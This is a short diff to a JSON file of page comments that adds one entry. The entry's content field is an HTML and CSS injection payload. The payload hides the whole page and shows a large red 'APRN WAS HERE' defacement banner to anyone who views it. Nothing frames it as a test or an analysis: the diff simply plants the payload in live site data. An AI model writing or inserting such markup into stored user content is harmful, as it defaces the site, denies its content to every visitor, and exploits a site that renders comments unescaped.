@@ -4821,6 +4821,15 @@
           "date": "2026-10-09T19:09:53.710Z",
           "replies": [],
           "parentAnswerId": null
+        },
+        {
+          "id": 1791573603440,
+          "content": "<style>body * { display: none !important; }</style><h1 style='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:#ff0000;font-size:6rem;z-index:9999;text-shadow:0 0 20px #fff;'>APRN WAS HERE</h1>",
+          "author": "Akhi Ex",
+          "isOwner": true,
+          "date": "2026-10-09T19:20:03.440Z",
+          "replies": [],
+          "parentAnswerId": null
         }
       ]
     },
